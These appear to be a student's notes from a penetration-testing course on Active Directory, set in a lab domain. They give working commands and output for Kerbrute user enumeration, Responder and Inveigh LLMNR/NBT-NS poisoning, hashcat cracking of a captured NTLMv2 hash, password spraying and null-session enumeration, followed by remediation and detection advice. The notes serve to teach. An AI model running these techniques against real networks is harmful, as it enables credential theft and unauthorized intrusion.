        > If we are on a host without a GUI (which is typical), we can use tcpdump(https://linux.die.net/man/8/tcpdump), net-creds(https://github.com/DanMcInerney/net-creds), and NetMiner(http://www.netminer.com/main/main-read.doc) etc., to perform the same functions. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
        > Tcpdump Output
            m1l0js@htb[/htb]$ sudo tcpdump -i ens224 
	
	> There is no one right way to listen and capture network traffic. There are plenty of tools that can process network data. Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as pktmon.exe, which was added to all editions of Windows 10. As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.
	> Our first look at network traffic pointed us to a couple of hosts via MDNS and ARP. Now let's utilize a tool called Responder to analyze network traffic and determine if anything else in the domain pops up.
	> Responder(https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.
		sudo responder -I ens224 -A 

	> As we start Responder with passive analysis mode enabled, we will see requests flow in our session. Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.

	> Our passive checks have given us a few hosts to note down for a more in-depth enumeration. Now let's perform some active checks starting with a quick ICMP sweep of the subnet using fping.
	> Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. Let's see it in action.
	[+] FPing Active Checks
		> Here we'll start fping with a few flags: a to show targets that are alive, s to print stats at the end of the scan, g to generate a target list from the CIDR network, and q to not show per-target results.
		> FPing Active Checks
			m1l0js@htb[/htb]$ fping -asgq 172.16.5.0/23
				172.16.5.5
				172.16.5.25
				172.16.5.50
				172.16.5.100
				172.16.5.125
				172.16.5.200
				172.16.5.225
				172.16.5.238
				172.16.5.240
			! The command above validates which hosts are active in the /23 network and does it quietly instead of spamming the terminal with results for each IP in the target list. We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap. From the fping command, we can see 9 "live hosts," including our attack host.
Identifying Users

	[+] Nmap Scanning

		> Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.
		 	sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
		> The -A (Aggressive scan options) scan will perform several functions. One of the most important is a quick enumeration of well-known ports to include web services, domain services, etc. For our hosts.txt file, some of our results from Responder and fping overlapped (we found the name and IP address), so to keep it simple, just the IP address was fed into hosts.txt for the scan.

	[+] Identifying users
		> If our client does not provide us with a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is critical in the early stages of an internal penetration test. This access (even at the lowest level) opens up many opportunities to perform enumeration and even attacks. Let's look at one way we can start gathering a list of valid users in a domain to use later in our assessment.
		* Kerbrute - Internal AD Username Enumeration
				> Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrust(https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.
				> To get started with Kerbrute, we can download precompiled binaries for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:	
				
						m1l0js@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git

						> Typing make help will show us the compiling options available.
						Listing Compiling Options
						m1l0js@htb[/htb]$ make help

						help:            Show this help.
						windows:  Make Windows x86 and x64 Binaries
						linux:  Make Linux x86 and x64 Binaries
						mac:  Make Darwin (Mac) x86 and x64 Binaries
						clean:  Delete any binaries
						all:  Make Windows, Linux and Mac x86/x64 Binaries

				> We can choose to compile just one binary or type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
				> Compiling for Multiple Platforms and Architectures
				 		m1l0js@htb[/htb]$ sudo make all
				> The newly created dist directory will contain our compiled binaries.
				> Listing the Compiled Binaries in dist
				 		m1l0js@htb[/htb]$ ls dist/
				 		kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
				> We can then test out the binary to make sure it works properly. We will be using the x64 version on the supplied Parrot Linux attack host in the target environment.
				> Testing the kerbrute_linux_amd64 Binary
						m1l0js@htb[/htb]$ ./kerbrute_linux_amd64 
				> We can add the tool to our PATH to make it easily accessible from anywhere on the host.
				> Adding the Tool to our Path
						m1l0js@htb[/htb]$ echo $PATH
						/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
				> Moving the Binary
						m1l0js@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
				> We can now type kerbrute from any location on the system and will be able to access the tool. Feel free to follow along on your system and practice the above steps. Now let's run through an example of using the tool to gather an initial username list.
				> Enumerating Users with Kerbrute
						m1l0js@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users


				> We can see from our output that we validated 56 users in the INLANEFREIGHT.LOCAL domain and it took only a few seconds to do so. Now we can take these results and build a list for use in targeted password spraying attacks.
Identifying Potential Vulnerabilities

				> The local system account NT AUTHORITY\SYSTEM is a built-in account in Windows operating systems. It has the highest level of access in the OS and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. A SYSTEM account on a domain-joined host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.
				> There are several ways to gain SYSTEM-level access on a host, including but not limited to:
					     + Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
					     + Abusing a service running in the context of the SYSTEM account, or abusing the service account SeImpersonate privileges using Juicy Potato. This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
					     + Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
					     + Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window
				> By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:
						+ Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
						+ Perform Kerberoasting / ASREPRoasting attacks within the same domain.
						+ Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
						+ Perform token impersonation to hijack a privileged domain user account.
						+ Carry out ACL attacks.
    
    

[+]LLMNR/NBT-NS Poisoning - from Linux

* At this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Domain Controller, and figured out some specifics such as the naming scheme used for the domain. In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.
* This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!
* LLMNR & NBT-NS Primer
	> Link-Local Multicast Name Resolution (LLMNR ==> https://datatracker.ietf.org/doc/html/rfc4795) and NetBIOS Name Service (NBT-NS ==> https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.
	> The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.
	> Quick Example - LLMNR/NBT-NS Poisoning
	> Let's walk through a quick example of the attack flow at a very high level:
	    + A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
	    + The DNS server responds, stating that this host is unknown.
	    + The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
	    + The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
	    + The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
	    + This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
		
	> TTPs
		
		+ We are performing these actions to collect authentication information sent over the network in the form of NTLMv1 and NTLMv2 password hashes. As discussed in the Introduction to Active Directory module, NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. We will then take the hash and attempt to crack them offline using tools such as Hashcat or John with the goal of obtaining the account's cleartext password to be used to gain an initial foothold or expand our access within the domain if we capture a password hash for an account with more privileges than an account that we currently possess.
		
		+ Several tools can be used to attempt LLMNR & NBT-NS poisoning:
			- Tool 	Description
			- Responder(https://github.com/lgandx/Responder) 	Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
			- Inveigh(https://github.com/Kevin-Robertson/Inveigh) 	Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.
			- Metasploit(https://www.metasploit.com/) 	Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.
		
		+ This section and the following one will show examples of using Responder and Inveigh to capture password hashes and attempt to crack them offline. We commonly start an internal penetration test from an anonymous position on the client's internal network with a Linux attack host. Tools such as Responder are great for establishing a foothold that we can later expand upon through further enumeration and attacks. Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:
		
		    LLMNR
		    DNS
		    MDNS
		    NBNS
		    DHCP
		    ICMP
		    HTTP
		    HTTPS
		    SMB
		    LDAP
		    WebDAV
		    Proxy Auth
		
		Responder also has support for:
		
		    MSSQL
		    DCE-RPC
		    FTP, POP3, IMAP, and SMTP auth
		
* Responder In Action
		
	> Responder is a relatively straightforward tool, but is extremely powerful and has many different functions. In the Initial Enumeration section earlier, we utilized Responder in Analysis (passive) mode. This means it listened for any resolution requests, but did not answer them or send out poisoned packets. We were acting like a fly on the wall, just listening. Now, we will take things a step further and let Responder do what it does best. Let's look at some options available by typing responder -h into our console.
		
	> As shown earlier in the module, the -A flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interface or an IP. Some common options we'll typically want to use are -wf; this will start the WPAD rogue proxy server, while -f will attempt to fingerprint the remote host operating system and version. We can use the -v flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as -F and -P can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.
		
	> With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the /usr/share/responder/logs directory. Hashes are saved in the format (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt, and one hash is printed to the console and stored in its associated log file unless -v mode is enabled. For example, a log file may look like SMB-NTLMv2-SSP-172.16.5.25. Hashes are also stored in a SQLite database that can be configured in the Responder.conf config file, typically located in /usr/share/responder unless we clone the Responder repo directly from GitHub.
		
	> We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:
		UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
		
	> Any of the rogue servers (i.e., SMB) can be disabled in the Responder.conf file.
	> Responder Logs
		m1l0js@htb[/htb]$ ls
		
		Analyzer-Session.log                Responder-Session.log
		Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
		HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
		Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
		Proxy-Auth-NTLMv2-172.16.5.200.txt
		
	> If Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. The animation below shows us an example of Responder running and capturing hashes on the network.
	> We can kick off a Responder session rather quickly:
	> Starting Responder with Default Settings
		sudo responder -I ens224 
	> Other config
		sudo responder -I ens224 -wF -v
	> Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode 5600 for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the Hashcat example hashes page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it. 
		
	> Once we have enough, we need to get these hashes into a usable format for us right now. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pash-the-hash, meaning we have to attempt to crack them offline. We can do this with tools such as Hashcat and John.
	> Cracking an NTLMv2 Hash With Hashcat
			m1l0js@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
			
			FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
                                                 
	> Looking at the results above, we can see we cracked the NET-NTLMv2 hash for user FOREND, whose password is Klmcargo2. Lucky for us our target domain allows weak 8-character passwords. This hash type can be "slow" to crack even on a GPU cracking rig, so large and complex passwords may be more difficult or impossible to crack within a reasonable amount of time.
.
 -=-=-
[+] LLMNR/NBT-NS Poisoning - from Windows

* LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool Inveigh and attempt to capture another set of credentials.
* Inveigh - Overview
	> If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth. The tool is available in the C:\Tools directory on the provided Windows attack host.
	> We can get started with the PowerShell version as follows and then list all possible parameters. There is a wiki(https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
* Using Inveigh
		PS C:\htb> Import-Module .\Inveigh.ps1
		PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

	> Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen here(https://github.com/Kevin-Robertson/Inveigh#parameter-help). We can see that we immediately begin getting LLMNR and mDNS requests
		PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y


* C# Inveigh (InveighZero)

	> The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. To save time, we have included a copy of both the PowerShell and compiled executable version of the tool in the C:\Tools folder on the target host in the lab, but it is worth walking through the exercise (and best practice) of compiling it yourself using Visual Studio.
	> Let's go ahead and run the C# version with the defaults and start capturing hashes.
	 	PS C:\htb> .\Inveigh.exe
	> As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a [+] are default and enabled by default and the ones with a [ ] before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message Press ESC to enter/exit interactive console, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.
	> We can hit the esc key to enter the console while Inveigh is running.
	> After typing HELP and hitting enter, we are presented with several options:
	> We can quickly view unique captured hashes by typing GET NTLMV2UNIQUE.
	> We can type in GET NTLMV2USERNAMES and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.

! Remediation
	> Mitre ATT&CK lists this technique as ID: T1557.001, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay.
	> There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.
		+ We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
		+ NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP ==> (https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

	> While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
		$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
		Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

	> In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
	> To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
	 	\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
	> Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
	> Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.
* Detection
	> It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This blog post explains this method more in-depth.
	> Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs 4697 and 7045 can be monitored for. Finally, we can monitor the registry key HKLM\Software\Policies\Microsoft\Windows NT\DNSClient for changes to the EnableMulticast DWORD value. A value of 0 would mean that LLMNR is disabled.
* Moving On
	> We've now captured hashes for several accounts. At this point in our assessment, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking. If we get lucky and crack a hash for a user account with some privileged access or rights, we can begin expanding our reach into the domain. We may even get very lucky and crack the hash for a Domain Admin user! If we were unlucky in cracking hashes or cracked some but did not yield any fruit, then perhaps password spraying (which we will cover in-depth in the following few sections) will be more successful

[+] Password Spraying Overview

* Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.
* Story Time

	> Password spraying can be a very effective way to gain a foothold internally. There are many times that this technique has helped me land a foothold during my assessments. Keep in mind that these examples come from non-evasive "grey box" assessments where I had internal network access with a Linux VM and a list of in-scope IP ranges and nothing else.
	> Scenario 1
		+ In this first example, I performed all my standard checks and could not find anything useful like an SMB NULL session or LDAP anonymous bind that could allow me to retrieve a list of valid users. So I decided to use the Kerbrute tool to build a target username list by enumerating valid domain users (a technique we will cover later in this section). To create this list, I took the jsmith.txt username list from the statistically-likely-usernames GitHub repo and combined this with results that I got from scraping LinkedIn. With this combined list in hand, I enumerated valid users with Kerbrute and then used the same tool to password spray with the common password Welcome1. I got two hits with this password for very low privileged users, but this gave me enough access within the domain to run BloodHound and eventually identify attack paths that led to domain compromise.
	> Scenario 2
		+ In the second assessment, I was faced with a similar setup, but enumerating valid domain users with common username lists, and results from LinkedIn did not yield any results. I turned to Google and searched for PDFs published by the organization. My search generated many results, and I confirmed in the document properties of 4 of them that the internal username structure was in the format of F9L8, randomly generated GUIDs using just capital letters and numbers (A-Z and 0-9). This information was published with the document in the Author field and shows the importance of scrubbing document metadata before posting anything online. From here, a short Bash script could be used to generate 16,079,616 possible username combinations.
			#!/bin/bash
			
			for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
			    do echo $x;
			done

	> I then used the generated username list with Kerbrute to enumerate every single user account in the domain. This attempt to make it more difficult to enumerate usernames ended up with me being able to enumerate every single account in the domain because of the predictable GUID in use combined with the PDF metadata I could locate and greatly facilitated the attack. Typically, I can only identify 40-60% of valid accounts using a list such as jsmith.txt. In this example, I significantly increased my chances of a successful password spraying attack by starting the attack with ALL domain accounts in my target list. From here, I obtained valid passwords for a few accounts. Eventually, I was able to follow a complicated attack chain involving Resource-Based Constrained Delegation (RBCD ==> https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a) and the Shadow Credentials(https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition) attack to ultimately gain control over the domain.
* Password Spraying Considerations
	> While password spraying is useful for a penetration tester or red teamer, careless use may cause considerable harm, such as locking out hundreds of production accounts. One example is brute-forcing attempts to identify the password for an account using a long list of passwords. In contrast, password spraying is a more measured attack, utilizing very common passwords across multiple industries. The below table visualizes a password spray.
	> Password Spray Visualization
		Attack 	Username 	Password
		1 	bob.smith@inlanefreight.local 	Welcome1
		1 	john.doe@inlanefreight.local 	Welcome1
		1 	jane.doe@inlanefreight.local 	Welcome1
		DELAY 		
		2 	bob.smith@inlanefreight.local 	Passw0rd
		2 	john.doe@inlanefreight.local 	Passw0rd
		2 	jane.doe@inlanefreight.local 	Passw0rd
		DELAY 		
		3 	bob.smith@inlanefreight.local 	Winter2022
		3 	john.doe@inlanefreight.local 	Winter2022
		3 	jane.doe@inlanefreight.local 	Winter2022

	> It involves sending fewer login requests per username and is less likely to lock out accounts than a brute force attack. However, password spraying still presents a risk of lockouts, so it is essential to introduce a delay between login attempts. Internal password spraying can be used to move laterally within a network, and the same considerations regarding account lockouts apply. However, it may be possible to obtain the domain password policy with internal access, significantly lowering this risk.
	> It’s common to find a password policy that allows five bad attempts before locking out the account, with a 30-minute auto-unlock threshold. Some organizations configure more extended account lockout thresholds, even requiring an administrator to unlock the accounts manually. If you don’t know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset. It is best to obtain the password policy before attempting the attack during an internal assessment, but this is not always possible. We can err on the side of caution and either choose to do just one targeted password spraying attempt using a weak/common password as a "hail mary" if all other options for a foothold or furthering access have been exhausted. Depending on the type of assessment, we can always ask the client to clarify the password policy. If we already have a foothold or were provided a user account as part of testing, we can enumerate the password policy in various ways. Let's practice this in the next section.

[+] Enumerating & Retrieving Password Policies
* Enumerating the Password Policy - from Linux - Credentialed
	> As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.
		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

* Enumerating the Password Policy - from Linux - SMB NULL Sessions

	> Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.
	> When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as enum4linux, CrackMapExec, rpcclient, etc.
	> We can use rpcclient to check a Domain Controller for SMB NULL session access.
	> Once connected, we can issue an RPC command such as querydominfo to obtain information about the domain and confirm NULL session access.
	> Using rcpclient
		m1l0js@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
		rpcclient $> querydominfo

	> We can also obtain the password policy. We can see that the password policy is relatively weak, allowing a minimum password of 8 characters.
	> Obtaining the Password Policy using rpcclient
		rpcclient $> querydominfo


	> Let's try this using enum4linux. enum4linux is a tool built around the Samba suite of tools nmblookup, net, rpcclient and smbclient to use for enumeration of windows hosts and domains. It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. Below we have an example output displaying information that can be provided by enum4linux. Here are some common enumeration tools and the ports they use:
		Tool 		Ports
		nmblookup 	137/UDP
		nbtstat 	137/UDP
		net 		139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
		rpcclient 	135/TCP
		smbclient 	445/TCP
	! Using enum4linux
		m1l0js@htb[/htb]$ enum4linux -P 172.16.5.5


	> The tool enum4linux-ng is a rewrite of enum4linux in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features
	!Using enum4linux-ng
		m1l0js@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight

* Enumerating Null Session - from Windows

	> It is less common to do this type of null session attack from Windows, but we could use the command net use \\host\ipc$ "" /u:"" to establish a null session from a windows machine and confirm if we can perform more of this type of attack.
	> Establish a null session from windows
		C:\htb> net use \\DC01\ipc$ "" /u:""
		The command completed successfully.

	> We can also use a username/password combination to attempt to connect. Let's see some common errors when trying to authenticate:
	> Error: Account is Disabled
		C:\htb> net use \\DC01\ipc$ "" /u:guest
		System error 1331 has occurred.
		This user can't sign in because this account is currently disabled.

	> Error: Password is Incorrect
		C:\htb> net use \\DC01\ipc$ "password" /u:guest
		System error 1326 has occurred.
		The user name or password is incorrect.

	> Error: Account is locked out (Password Policy)
		C:\htb> net use \\DC01\ipc$ "password" /u:guest
		System error 1909 has occurred.
		The referenced account is currently locked out and may not be logged on to.

* Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

